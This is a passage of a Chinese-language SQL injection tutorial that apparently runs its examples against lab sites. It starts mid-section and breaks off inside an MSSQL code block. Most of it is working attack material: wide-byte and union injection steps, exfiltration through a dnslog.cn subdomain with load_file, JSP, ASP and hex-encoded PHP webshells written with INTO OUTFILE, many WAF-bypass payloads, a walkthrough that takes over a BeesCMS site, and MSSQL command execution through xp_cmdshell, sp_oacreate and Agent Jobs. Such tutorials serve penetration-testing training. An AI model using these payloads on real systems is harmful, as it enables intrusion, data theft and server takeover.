<h4 id="实例演示："><a href="#实例演示：" class="headerlink" title="实例演示："></a>实例演示：</h4><p>1、在id传参之后加个单引号，我设置了将传参输出出来，可以看到单引号前面加了一个反斜线。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316688943-fc742097-f3f9-40f1-b326-a4dd94d9691f.png#align=left&display=inline&height=217&margin=%5Bobject%2Object%5D&name=image.png&originHeight=435&originWidth=554&size=138295&status=done&style=none&width=277" alt="image.png"><br>2、通过宽字节注入将反斜线“吃”掉，合成一个汉字，这里因为浏览器设置的字符为UTF-8，所以输出的汉字为�。通过页面报错可以判断出，单引号已成功闭合。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316696285-c4740da5-d4f3-4e5e-b82e-a102fbba775d.png#align=left&display=inline&height=232&margin=%5Bobject%2Object%5D&name=image.png&originHeight=463&originWidth=554&size=157491&status=done&style=none&width=277" alt="image.png"><br>3、接下来通过order by判断数据库当前字段数，因为order by 4的时候页面报错了，所以当前字段数为3。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316701085-c5629ba1-eecd-4178-b782-2c8d1e94f979.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=554&size=111411&status=done&style=none&width=277" alt="image.png"><br>4、通过union select 判断出注入点为2和3。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316704781-2eaf1548-62d5-40ca-88a4-14d15e5d6846.png#align=left&display=inline&height=158&margin=%5Bobject%2Object%5D&name=image.png&originHeight=315&originWidth=554&size=114990&status=done&style=none&width=277" alt="image.png"><br>5、通过注入点3获取flag数据表中的flag字段的数据。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316709078-a312c8bf-4c31-4804-8a5f-8d9d9f550a58.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=284&originWidth=554&size=110536&status=done&style=none&width=277" alt="image.png"></p>
<h2 id="巧用dnslog进行SQL注入"><a href="#巧用dnslog进行SQL注入" class="headerlink" title="巧用dnslog进行SQL注入"></a>巧用dnslog进行SQL注入</h2><p>前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。</p>
<h3 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h3><p>dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。</p>
<h3 id="Load-file-函数"><a href="#Load-file-函数" class="headerlink" title="Load_file()函数"></a>Load_file()函数</h3><p>数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：<br>1.文件在服务器上<br>2.指定完整路径的文件<br>3.必须有FILE权限</p>
<h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><p>UNC路径就是类似\softer这样的形式的网络路径。它符合 \服务器名\服务器资源的格式。在Windows系统中常用于共享文件。如\192.168.1.1\共享文件夹名。</p>
<h3 id="Dnslog注入实例演示"><a href="#Dnslog注入实例演示" class="headerlink" title="Dnslog注入实例演示"></a>Dnslog注入实例演示</h3><p>1、打开实例站点，很明显这里是只能使用盲注的站点。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316770534-feb5fdac-7aaa-4ab5-b3ae-5fee2527e378.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=93920&status=done&style=none&width=277" alt="image.png"><br>2、通过order by判断出字段数为3。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316780268-de0c44d2-5a42-4df4-8494-a5ed756a6a74.png#align=left&display=inline&height=159&margin=%5Bobject%2Object%5D&name=image.png&originHeight=318&originWidth=554&size=123643&status=done&style=none&width=277" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316786769-374898f3-3106-480a-a051-e052e96a70d9.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&name=image.png&originHeight=305&originWidth=554&size=116956&status=done&style=none&width=277" alt="image.png"><br>3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316791333-e038d4ba-3515-4425-a67c-dd7c505975a8.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=32567&status=done&style=none&width=277" alt="image.png"><br>4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：<br>?id=1 ‘ union select 1,2,load_file(concat(‘//‘,(select database()),’.pcijrt.dnslog.cn<br>/abc’)) %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316796222-379b515f-d134-405f-91cf-d1e33861c093.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=90883&status=done&style=none&width=277" alt="image.png"><br>5、执行语句之后在dnslog日志中获取到数据库库名为security。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316800618-e7303cd5-9bdb-47de-aeda-5ced9575829d.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=38670&status=done&style=none&width=277" alt="image.png"><br>6、修改子查询里的内容，获取其他数据。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316804136-4715642b-040c-4f5a-8e0c-29d883c01903.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=554&size=92826&status=done&style=none&width=277" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316855097-fc68b2f4-3483-4996-818a-3890d70aa7ac.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=46229&status=done&style=none&width=277" alt="image.png"></p>
<h2 id="SQL注入写入webshell"><a href="#SQL注入写入webshell" class="headerlink" title="SQL注入写入webshell"></a>SQL注入写入webshell</h2><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>Webshell，以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。攻击者可以通过获取webshell来对网站进行操作，包括任意文件上传下载、查看数据库、执行任意程序代码等。常见webshell分类如下：<br><strong>jsp</strong><br>&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;<br><strong>asp</strong><br>success!!!!&lt;%eval request(“cmd”)%&gt;<br><strong>php</strong></p>
<h3 id="out-file-amp-dump-file"><a href="#out-file-amp-dump-file" class="headerlink" title="out_file&amp;dump_file"></a>out_file&amp;dump_file</h3><p>在dnslog注入中我们了解到了mysql数据库中可以通过load_file加载读取服务器上的文件，与之对应的则是通过out_file和dump_file读取文件。写入webshell需要具有几个条件：当前数据库用户为root、具有写入文件的权限、拥有当前站点的绝对路径。<br>通过sql注入写webshell的具体用法：<br>select  into outfile ‘C:/phpStudy/WWW/1.php’<br>select  into dumpfile ‘C:/phpStudy/WWW/1.php’<br>二者的区别在于，outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。<br>在写文件的时候，因为是在传参中写入的，总会被一些单引号，美元符等具有特殊意义的字符影响，这时候我们能够通过将需要传输的文件内容进行16进制转换再传入数据库中执行，mysql数据库会解析16进制的内容，那么就可以不受特殊字符影响写入webshell了。</p>
<h2 id="SQL注入如何绕过waf"><a href="#SQL注入如何绕过waf" class="headerlink" title="SQL注入如何绕过waf"></a>SQL注入如何绕过waf</h2><p>在进行渗透测试的时候，经常会遇到被waf拦截的情况。waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。Waf对于渗透测试人员来说，也就是规则，通俗点就是这个结构:<br>If(xxx){<br>拦截！<br>}else{<br>通过<br>}<br>所以只需要让它同意我的操作，即绕过了waf。通常的waf一般可以有以下绕过方法：</p>
<h4 id="1、大小写绕过"><a href="#1、大小写绕过" class="headerlink" title="1、大小写绕过"></a>1、大小写绕过</h4><p>?id=1 and UnIoN sElEcT 1,2,3<br>?id=1 OrDeR By 1</p>
<h4 id="2、双写绕过"><a href="#2、双写绕过" class="headerlink" title="2、双写绕过"></a>2、双写绕过</h4><p>一些防护措施只进行一次，可以通过双写关键字的方法绕过。<br>Id=1 ununionion selselectect 1,2,3 删除一次–&gt; union select<br>Id=1 ororderder bbyy    1    删除一次–&gt; order by</p>
<h4 id="3、编码绕过"><a href="#3、编码绕过" class="headerlink" title="3、编码绕过"></a>3、编码绕过</h4><p>如果检测的是关键字，那么经过编码即可绕过<br>URL全编码：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316953774-1c273318-df76-4e94-a6d4-3a05b0aa9057.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=170&originWidth=554&size=32436&status=done&style=none&width=277" alt="image.png"><br>十六进制（使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识）：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316957860-0c58f7b6-544c-4125-9937-5e35e01e675f.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&name=image.png&originHeight=240&originWidth=554&size=17636&status=done&style=none&width=277" alt="image.png"></p>
<h4 id="4、基本符号替换"><a href="#4、基本符号替换" class="headerlink" title="4、基本符号替换"></a>4、基本符号替换</h4><p>用&amp;&amp;替换and<br>用||替换or<br>用/**/替换空格<br>URL栏中用+替换空格</p>
<h4 id="5、报错注入替换函数绕过"><a href="#5、报错注入替换函数绕过" class="headerlink" title="5、报错注入替换函数绕过"></a>5、报错注入替换函数绕过</h4><p>有的时候，网站只检测一部分热门的函数，不检测一些冷门的函数。下面以select user() 为例，给出几种报错注入的payload：<br>1.floor()<br>id = 1 and (select 1 from  (select count(_),concat(user(),floor(rand(0)_2))x from  information_schema.tables group by x)a)<br>2. extractvalue()<br>id = 1 and (extractvalue(1, concat(0x5c,(select user()))))<br>id = 1 and extractvalue(1,concat(char(126),database()))<br>3. updatexml()<br>id = 1 and (updatexml(0x3a,concat(1,(select user())),1))</p>
<p>4.exp()<br>exp(~(select * from(select user()))a))</p>
<p>5.GeometryCollection()<br>Id=1 and GeometryCollection((select _ from(select _ from(select user())a)b))</p>
<p>6.Polygon</p>
<p>Id = 1 and polygon((select _ from (select _ from(select user())a)b))</p>
<p>7.Multipoint()</p>
<p>Id = 1 and Multipoint ((select _ from (select _ from(select user())a)b))</p>
<p>8.Multilinestring()</p>
<p>Id = 1 and Multilinestring ((select _ from (select _ from(select user())a)b))</p>
<p>9.multipolygon</p>
<p>Id = 1 and multipolygon ((select _ from (select _ from(select user())a)b))</p>
<p>10.linestring()</p>
<p>Id = 1 and linestring ((select _ from (select _ from(select user())a)b))</p>
<h4 id="6、其他等价函数绕过"><a href="#6、其他等价函数绕过" class="headerlink" title="6、其他等价函数绕过"></a>6、其他等价函数绕过</h4><p>hex()、bin() ==&gt; ascii()<br>sleep() &gt;benchmark()<br>concat_ws()&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@<a href="/user">@user </a> ==&gt; user()<br>@<a href="/database">@database </a> ==&gt; database() </p>
<h4 id="7、内联注释配合注释绕过"><a href="#7、内联注释配合注释绕过" class="headerlink" title="7、内联注释配合注释绕过"></a>7、内联注释配合注释绕过</h4><p>Id=1/**//<em>! order</em>/+/<em>!by</em>/+1</p>
<h4 id="8、-0a换行跳出单行注释绕过"><a href="#8、-0a换行跳出单行注释绕过" class="headerlink" title="8、%0a换行跳出单行注释绕过"></a>8、%0a换行跳出单行注释绕过</h4><p>原理：数据库中对于#和–（空格）后面的东西都进行注释忽略处理<br>我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。<br>Payload：<br>id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201<br>id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3</p>
<h4 id="9、利用一些中间件的缺陷"><a href="#9、利用一些中间件的缺陷" class="headerlink" title="9、利用一些中间件的缺陷"></a>9、利用一些中间件的缺陷</h4><p>（1）IIS+ASP<br>通过在关键词之间加%绕过。Id=1 and uni%on se%le%ct 1,2,3 from ad%min<br>（2）IIS的Unicode编码<br>IIS支持Unicode编码，可以通过编码关键词进行绕过：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316976370-63e00d2f-1d76-4702-a4ad-53ff3433f16a.png#align=left&display=inline&height=60&margin=%5Bobject%2Object%5D&name=image.png&originHeight=120&originWidth=554&size=13102&status=done&style=none&width=277" alt="image.png"><br>（3）HTTP参数污染<br>有的时候，浏览器对于这样的传参会出现以下情况：<br>Id=1 and id=2 –&gt; 出现在服务器中，id=1,2<br>那么我们可以这样绕：<br>id=1 and union select username &amp; id= password form admin<br>–&gt; id=1 and union select username, password form admin</p>
<p>对于这种参数重复传参的情况，不同环境有不同结果：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316984361-71fe98b2-2426-402d-b268-79db169fbe80.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&name=image.png&originHeight=296&originWidth=554&size=37024&status=done&style=none&width=277" alt="image.png"></p>
<h4 id="10、更换传参方式绕过"><a href="#10、更换传参方式绕过" class="headerlink" title="10、更换传参方式绕过"></a>10、更换传参方式绕过</h4><p>在有些情况下，因为$_REQUEST[‘id’]的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了post传参或者cookie传参。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316989645-f827a3cc-d359-4246-9d0f-13eb04fd7b84.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=248&originWidth=554&size=48512&status=done&style=none&width=277" alt="image.png"></p>
<h4 id="11、利用数据提取方式的缺陷进行绕过"><a href="#11、利用数据提取方式的缺陷进行绕过" class="headerlink" title="11、利用数据提取方式的缺陷进行绕过"></a>11、利用数据提取方式的缺陷进行绕过</h4><p>Example：<br>在PHP+Apache中<br>x=1&amp;y=2&amp;z=3 在某些waf中会被提取为：<br>x=1<br>y=2<br>z=3<br>payload:<br>id=1+union+/<em>&amp;x=2</em>/+select/<em>&amp;y=3</em>/+1,2,3+from+admin<br>waf检测方式为分别检测三个传参：<br>id=1+union+/*<br>x=2_/+select/_<br>y=3*/1,2,3+from+admin</p>
<p>数据库中，/**/中间的东西被过滤了，获得的传参为：<br>id=1+union+select+1,2,3+from+admin</p>
<h4 id="12、脏数据绕过"><a href="#12、脏数据绕过" class="headerlink" title="12、脏数据绕过"></a>12、脏数据绕过</h4><p>在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316997116-7a6e21e0-2b25-4f10-b49c-e767e0216794.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=125231&status=done&style=none&width=277" alt="image.png"><br>下面给出生成垃圾数据的脚本：<br>#coding=utf-8<br>import random,string<br>from urllib import parse<br>code by yzddMr6</p>
<p>varname_min = 5<br>varname_max = 15<br>data_min = 20<br>data_max = 25<br>num_min = 50<br>num_max = 100<br>def randstr(length):<br>str_list = [random.choice(string.ascii_letters) for i in range(length)]<br>random_str = ‘’.join(str_list)<br>return random_str<br>def main():<br>data={}<br>for i in range(num_min,num_max):<br>data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))<br>print(‘&amp;’+parse.urlencode(data)+’&amp;’)<br>main()</p>
<h3 id="SQL注入实战渗透测试"><a href="#SQL注入实战渗透测试" class="headerlink" title="SQL注入实战渗透测试"></a>SQL注入实战渗透测试</h3><p>1、首先打开指定站点，这里是以beescms搭建的网站<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317033373-8f7c7d9b-b60a-451a-b28d-ba425f92f9b4.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=554&size=81788&status=done&style=none&width=277" alt="image.png"> <br>2、通过御剑扫描发现了后台路径/admin/login.php<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317036903-c1a03aaf-c415-48e7-a1c9-6b124a0aa140.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=291&originWidth=554&size=59025&status=done&style=none&width=277" alt="image.png"><br>3、访问后台<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317042060-67c5cd02-56e2-44e5-a90f-05749886fcdc.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=283&originWidth=554&size=60786&status=done&style=none&width=277" alt="image.png"><br>4、抓包并发送到重放数据包模块进行测试<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317045189-57e2568e-0bce-4732-a132-41fb7f0f1967.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=237&originWidth=554&size=59839&status=done&style=none&width=277" alt="image.png"><br>5、在账号处加一个单引号测试，发现页面报错了，这里说明存在SQL注入<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317049040-76788297-cf7a-498a-bf05-a94be7c5846d.png#align=left&display=inline&height=92&margin=%5Bobject%2Object%5D&name=image.png&originHeight=184&originWidth=554&size=53711&status=done&style=none&width=277" alt="image.png"><br>6、打开源码，找到该登录处，发现对于post传参的user进行了函数fl_value和fl_html处理。处理之后后面就放到check_login函数执行了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317053351-e7c46278-96ce-446c-9113-49f608e9462e.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=64458&status=done&style=none&width=277" alt="image.png"><br>7、定位fl_value函数，发现对于SQL注入进行了处理，将敏感字符过滤为空。<br>过滤的敏感字符有：select | insert | update | and | in | on | left | joins | delete | %| = | / * | * | ../ | ./ | union | from | where | group | into | load_file | outfile<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317057459-1b75bd6c-f68f-471d-803f-4606333306ff.png#align=left&display=inline&height=43&margin=%5Bobject%2Object%5D&name=image.png&originHeight=85&originWidth=554&size=19441&status=done&style=none&width=277" alt="image.png"><br>8、很明显这里防SQL注入进行的不是很到位，只进行了一次替换为空，那么就可以通过双写关键字进行绕过。定位第二个处理函数fl_html，发现这里是进行了html实体化处理，是防止xss的，htmlspecialchars函数默认情况下只对双引号进行编码，对我们使用单引号进行SQL注入没有影响。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317060800-0510c154-b4ff-4202-9b12-37db39d11e93.png#align=left&display=inline&height=29&margin=%5Bobject%2Object%5D&name=image.png&originHeight=58&originWidth=366&size=11625&status=done&style=none&width=183" alt="image.png"><br>9、跟进check_login函数，发现将传入的数据直接放到了SQL查询语句进行查询。那么此处通过双写即可绕过进行注入了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317065197-0ab9f91c-73e7-4991-b518-2a049007d84d.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&name=image.png&originHeight=115&originWidth=554&size=27857&status=done&style=none&width=277" alt="image.png"><br>10、回到网站，通过order by 判断出当前数据库字段数为5<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317068401-fc66cb55-5dfb-41f7-9f55-726dab9ffd30.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=50976&status=done&style=none&width=277" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317071848-afb83dbf-a19a-40fb-9c66-af5cabf23c07.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=45734&status=done&style=none&width=277" alt="image.png"><br>11、经测试，联合查询终于成功了。绕过方法：<br>un union ion -&gt; union<br>seselectlect -&gt; select<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317076201-0c74fd9e-0530-4941-8e19-68fffcaade81.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=51714&status=done&style=none&width=277" alt="image.png"><br>12、这里很明显不能显错注入，尝试使用报错注入获取数据也失败，没有将报错的数据输出出来。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317082978-87ccd5f5-eed6-42b8-bd8c-d313b5d51ff3.png#align=left&display=inline&height=117&margin=%5Bobject%2Object%5D&name=image.png&originHeight=234&originWidth=554&size=62436&status=done&style=none&width=277" alt="image.png"><br>13、尝试使用sql注入写入webshell，发现页面报错了，通过报错信息可以看到是写入的一句话木马里面带有特殊字符影响了文件的写入。对于敏感字符的绕过方法：<br>in into  -&gt; into<br>ououtfiletfile -&gt; outfile<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317086950-f53a248a-e529-424b-8033-3d275770dfae.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&name=image.png&originHeight=232&originWidth=554&size=65986&status=done&style=none&width=277" alt="image.png"><br>14、因为符号进行了影响，所以通过16进制来写入webshell，将一句话木马转换为16进制。因为需要数据库识别出这个是16进制的数据，所以要在最前面加上0x。得到16进制的一句话木马：<br>0x3c3f70687020406576616c28245f524551554553545b315d293b3f3e<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317091049-51499331-b0a7-4eb4-9941-6a45055e0e2d.png#align=left&display=inline&height=152&margin=%5Bobject%2Object%5D&name=image.png&originHeight=304&originWidth=554&size=19492&status=done&style=none&width=277" alt="image.png"><br>15、替换16进制的一句话木马到burp数据包中放包，成功执行了代码，页面返回正常。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317094983-f7fb5184-1a94-4cf1-8295-4c3423910346.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=247&originWidth=554&size=62722&status=done&style=none&width=277" alt="image.png"><br>16、查看服务器文件，成功有了一个8.php文件，内容为一句话木马。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317099323-d646af4a-b862-405d-823c-b2975028e63e.png#align=left&display=inline&height=127&margin=%5Bobject%2Object%5D&name=image.png&originHeight=254&originWidth=554&size=56751&status=done&style=none&width=277" alt="image.png"><br>17、通过菜刀工具，连接一句话木马，获取网站webshell。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317103226-679c62de-5503-4996-9ea4-acbbad2e0683.png#align=left&display=inline&height=119&margin=%5Bobject%2Object%5D&name=image.png&originHeight=238&originWidth=554&size=18591&status=done&style=none&width=277" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317106445-a24046e6-17ce-443d-b37b-63bd3fc90125.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=274&originWidth=554&size=41660&status=done&style=none&width=277" alt="image.png"><br>18、进行执行系统命令操作。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317113216-93f538c1-d58a-4bac-b262-a15d676aa57a.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=27211&status=done&style=none&width=277" alt="image.png"></p>
<h2 id="其他类型的SQL注入"><a href="#其他类型的SQL注入" class="headerlink" title="其他类型的SQL注入"></a>其他类型的SQL注入</h2><h3 id="1、搜索框注入"><a href="#1、搜索框注入" class="headerlink" title="1、搜索框注入"></a>1、搜索框注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span>%<span class="string">&#x27;=&#x27;</span><span class="number">1</span>		<span class="comment">//返回正确的搜索结果</span></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span>%<span class="string">&#x27;=&#x27;</span><span class="number">2</span>		<span class="comment">//没有返回结果</span></span><br></pre></td></tr></table></figure>
<h3 id="2、header头部注入"><a href="#2、header头部注入" class="headerlink" title="2、header头部注入"></a>2、header头部注入</h3><p>Client-IP<br>User-Agent<br>X-Forwarded-For</p>
<h2 id="SQL注入利用"><a href="#SQL注入利用" class="headerlink" title="SQL注入利用"></a>SQL注入利用</h2><h3 id="1、MSSQL"><a href="#1、MSSQL" class="headerlink" title="1、MSSQL"></a>1、MSSQL</h3><h4 id="0x01-–os-shell"><a href="#0x01-–os-shell" class="headerlink" title="0x01 –os-shell"></a>0x01 –os-shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r C: %i in (*<span class="number">020</span>.jpg*) <span class="keyword">do</span> @<span class="keyword">echo</span> %i <span class="comment">//寻找020.jpg，获取所在目录</span></span><br><span class="line"></span><br><span class="line">dir c:\phpstudy\WWW\image								<span class="comment">//列出某目录下文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ^&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%^&gt;^&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;1&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%^&gt; &gt; c:\phpstudy\WWW\image\shell.asp</span><br></pre></td></tr></table></figure>
<h4 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h4><p>1、xp_cmdshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启xp_cmdshell</span></span><br><span class="line">?id=<span class="number">1</span>;<span class="keyword">use</span> <span class="title">master</span>;exec sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;reconfigure;exec sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;reconfigure;</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">?id=<span class="number">1</span>;<span class="keyword">use</span> <span class="title">master</span>;exec master..xp_cmdshell <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#恢复被删除的xp_cmdshell(提示xplog79.dll找不到则自己上传)</span></span><br><span class="line">exec sp_addextendedproc xp_cmdshell ,@dllname=<span class="string">&quot;D:\\xplog79.dll&quot;</span></span><br></pre></td></tr></table></figure>
<p>2、sp_oacreate</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#xp_cmdshell删除后可以使用sp_oacreate</span><br><span class="line">#开启sp_oacreate</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">reconfigure <span class="keyword">with</span> override;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">reconfigure <span class="keyword">with</span> override;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#执行[此方法无回显]</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt&#x27;</span></span><br></pre></td></tr></table></figure>
<p>3、通过沙盒执行命令<br>4、注册表<br>5、通过Agent Job执行命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#执行cs powershell命令</span><br><span class="line">USE msdb; <span class="keyword">EXEC</span> dbo.sp_add_job <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;test_powershell_job1&#x27;</span> ; <span class="keyword">EXEC</span> sp_add_jobstep <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;test_powershell_job1&#x27;</span>, <span class="variable">@step</span>_name <span class="operator">=</span> N<span class="string">&#x27;test_powershell_name1&#x27;</span>, <span class="variable">@subsystem</span> <span class="operator">=</span> N<span class="string">&#x27;PowerShell&#x27;</span>, <span class="variable">@command</span> <span 